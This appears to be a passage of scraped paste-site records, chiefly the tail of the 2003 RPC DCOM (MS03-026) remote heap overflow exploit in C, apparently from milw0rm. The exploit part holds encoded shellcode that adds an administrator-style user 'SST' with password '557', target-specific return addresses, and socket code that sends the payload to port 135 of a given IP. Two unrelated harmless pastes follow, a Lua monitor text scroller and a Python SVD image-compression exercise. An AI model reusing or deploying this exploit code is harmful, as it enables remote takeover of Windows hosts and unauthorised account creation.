,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00
,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00
,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00
,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x46,0x00,0x43,0x00,0x24,0x00,0x46,0x00,
0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00
,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};



unsigned char sccnsp3sp4[]=
    ""\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00""
    ""\x6F\x00\x73\x00\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00""

    ""\x58\x00\xeb\x3c\x46\x00\x46\x00\xeb\x7c\x46\x00\x46\x00\x38\x6e""
    ""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""
    ""\xeb\x1e\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""
    ""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xeb\x06\xf1\xe1\xf2\xe1\xea\xd2""    

//SHELLCODE From  SAM ,THANKs !
//Add user SST,password is 557,
""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4D\x01\x80\x34\x0A\x99\xE2\xFA""
""\xEB\x05\xE8\xEB\xFF\xFF\xFF""

""\x70\xDA\x98\x99\x99\xCC\x12\x75\x18\x75\x19\x99\x99\x99\x12\x6D""
""\x71\x92\x98\x99\x99\x10\x9F\x66\xAF\xF1\x01\x67\x13\x97\x71\x3C""
""\x99\x99\x99\x10\xDF\x95\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x0F\x99""
""\x99\x99\x10\xDF\x89\xFD\x38\x81\x99\x99\x99\x12\xD9\xA9\x14\xD9""
""\x81\x22\x99\x99\x8E\x99\x10\x81\xAA\x59\xC9\xF3\xFD\xF1\xB9\xB6""
""\xF8\xFD\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED""
""\xB9\x12\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xB9\xAC\xAC\xAE""
""\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED\xB9\x12""
""\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xFD\xFD\x99\x99\xF1\xED""
""\xB9\xB6\xF8\xF1\xEA\xB9\xEA\xEA\xF1\xF8\xED\xF6\xEB\xF1\xF0\xEA""
""\xED\xEB\xF1\xFD\xF4\xF0\xF7\xF1\xEC\xE9\xB9\xF8\xF1\xF5\xFE\xEB""
""\xF6\xF1\xF5\xF6\xFA\xF8\xF1\xF7\xFC\xED\xB9\x12\x55\xC9\xC8\x66""
""\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81""
""\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A""
""\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3""
""\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78""
""\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D""
""\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99""
""\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12""
""\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99""
""\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\x21\x67\x66\x66""

    ""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""
    ""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""
    ""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""
    ""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""
    ""\x7f\x19\x95\xd5\x17\x53\xe6\x6a""
    ""\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""
    ""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90\x90""     //
    ""\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x77\xe0\x43\x00\x00\x10\x5c\x00""
    ""\xeb\x1e\x01\x00""//     FOR CN SP3/SP4+-MS03-26
    ""\x4C\x14\xec\x77""//    TOP SEH FOR cn w2k+SP4,must modify to SEH of your target's os 


//FILL BYTE,so sizeof(UNC)>0X400(0X80*8),why? You can read more form  my artic 
//""Utilization of released heap structure and exploit of universal Heap overflow in windows "".
""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x90\x02\x80\x34\x0A\x99\xE2\xFA""
""\xEB\x05\xE8\xEB\xFF\xFF\xFF""
""\xC7\x5F\x9D\xBD\xDD\x14\xDD\xBD\xDD\xC9\x14\xDD\xBD\x9D\xC9\x14""
""\x1D\xBD\x1D\x99\x99\x99\xC9\x14\x1D\xBD\x0D\x99\x99\x99\xC9\xAA""
""\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\x2D\x99\x99\x99\xC9\x66\xCF""
""\x95\x14\xD5\xBD\xDD\x14\x8D\xBD\xAA\x59\xC9\xF1\xAC\x99\xAE\x99""
""\xF1\xB9\x99\xAC\x99\xF1\xEA\x99\xED\x99\xF1\xB9\x99\xEA\x99\xF1""
""\xFC\x99\xEB\x99\xF1\xEC\x99\xEA\x99\xF1\xED\x99\xB9\x99\xF1\xF7""
""\x99\xFC\x99\x12\x45\xC8\xCB\xC8\xCB\x14\x1D\xBD\x29\x99\x99\x99""
""\xC9\x14\x1D\xBD\x59\x99\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA""
""\x14\x1D\xBD\x79\x99\x99\x99\xC9\x66\xCF\x95\xC3\xC0\xAA\x59\xC9""
""\xF1\xFD\x99\xFD\x99\xF1\xB6\x99\xF8\x99\xF1\xED\x99\xB9\x99\xF1""
""\xEA\x99\xEA\x99\xF1\xEA\x99\xB9\x99\xF1\xF6\x99\xEB\x99\xF1\xF8""
""\x99\xED\x99\xF1\xED\x99\xEB\x99\xF1\xF0\x99\xEA\x99\xF1\xF0\x99""
""\xF7\x99\xF1\xFD\x99\xF4\x99\xF1\xB9\x99\xF8\x99\xF1\xEC\x99\xE9""
""\x99\xF1\xEB\x99\xF6\x99\xF1\xF5\x99\xFE\x99\xF1\xFA\x99\xF8\x99""
""\xF1\xF5\x99\xF6\x99\xF1\xED\x99\xB9\x99\xF1\xF7\x99\xFC\x99\x12""
""\x45\xC8\xCB\x14\x1D\xBD\x61\x99\x99\x99\xC9\x14\x1D\xBD\x91\x98""
""\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\xB1\x98\x99""
""\x99\xC9\x66\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12""
""\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12""
""\xC3\xB9\x9A\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA""
""\x59\x35\xA3\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD""
""\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A""
""\x44\x12\x9D\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2""
""\x5B\x9D\x99\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12""
""\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31""
""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\xEC\x64\x66\x66""

""\x04\x04\x00\x70\x00\x04\x40""
""\x00\x10\x5c\x00\x78\x01\x07\x00\x78\x01\x07\x00\xa0\x04\x00""

""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71"";


unsigned char request4[]={
0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00
,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C
,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];

    printf(""RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n"");
    printf(""Code by FlashSky,Flashsky xfocus org\n"");
    printf(""Welcome to our Site: http://www.xfocus.org\n"");
    printf(""Welcome to our Site: http://www.venustech.com.cn\n"");
    if(argc!=2)
    {
        printf(""%s targetIP \n"",argv[0]);
        printf(""for cn w2k server sp3/sp4+ms03-26\n"");
    }
    
    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf(""WSAStartup error.Error:%d\n"",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    
    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf(""Socket failed.Error:%d\n"",WSAGetLastError());
        return;
    }
    len1=sizeof(request1);
    len=sizeof(sccnsp3sp4);

    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf(""Connect failed.Error:%d"",WSAGetLastError());
        return;
    }
    memcpy(buf2,request1,sizeof(request1));
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sccnsp3sp4)/2;  
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sccnsp3sp4)/2;
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sccnsp3sp4,sizeof(sccnsp3sp4));
    len1=len1+sizeof(sccnsp3sp4);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;

    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;  
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;
    if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
    {
            printf(""Send failed.Error:%d\n"",WSAGetLastError());
            return;
    }
    
    len=recv(sock,buf1,1000,NULL);
    if (send(sock,buf2,len1,0)==SOCKET_ERROR)
    {
            printf(""Send failed.Error:%d\n"",WSAGetLastError());
            return;
    }
//    len=recv(sock,buf1,1024,NULL);
}

/*

*/

// milw0rm.com [2003-09-20]
            "
YTHMBBQJ,Untitled,Driftix,Lua,Saturday 2nd of March 2024 03:39:13 AM CDT,"

local monitor = peripheral.find(""monitor"")

function display(message,x,y,speed)
    
    monitor.setTextScale(5)
    monitor.clear()
    monitor.setCursorPos(x,y)
    monitor.write(message)
    os.sleep(speed)
end

function displayText()
    if monitor then
        local message = ""Vive la démocratie""
        local speed = 0.1
        local width, height = monitor.getSize()
        local y = math.floor((height/2)-1)
        local x = width
        print(x)
        print(y)
        while x > -string.len(message) do
            display(message,x,y,speed)
            x = x - 1
        end
        displayText()
    else
        print(""Pas d'écran en sah"")
    end
end

displayText()"
JS6h7fwf,Untitled,nvrskadmin,Python,Saturday 2nd of March 2024 03:36:20 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
# Скачивание картинки.
from PIL import Image, ImageOps
import requests

# Ссылка на картинку.
url = ""https://code.s3.yandex.net/math-adult/explanations/linal/1/svd/frog.jpeg""

# Скачивание и сохранение картинки в переменную.
im = ImageOps.grayscale(Image.open(requests.get(url, stream=True).raw))
# Превращение картинки в NumPy-массив.
frog = np.array(im).astype(float)


def show_image(img):
	plt.figure(figsize=(12, 8))
	plt.imshow(img, cmap='gray')
	plt.xticks([])
	plt.yticks([])

show_image(frog)

# Ваш код
U, s, VT = np.linalg.svd(frog, full_matrices=False)
S = np.diag(s)  # Превращаем вектор в диагональную матрицу.
k = 1
X_approx = U[:, 0:k] * S[0:k, 0:k] @ VT[0:k, :]
mass = round((X_approx.size * 8) / 1024 / 1024, 1)
print(mass)
# while mass < 1.2:
#     k += 1
#     X_approx = U[:, 0:k] @ S[0:k, 0:k] @ VT[0:k, :]
#     mass = round((X_approx.size * 8) / 1024 / 1024, 1)
#

show_image(X_approx)
plt.show()"
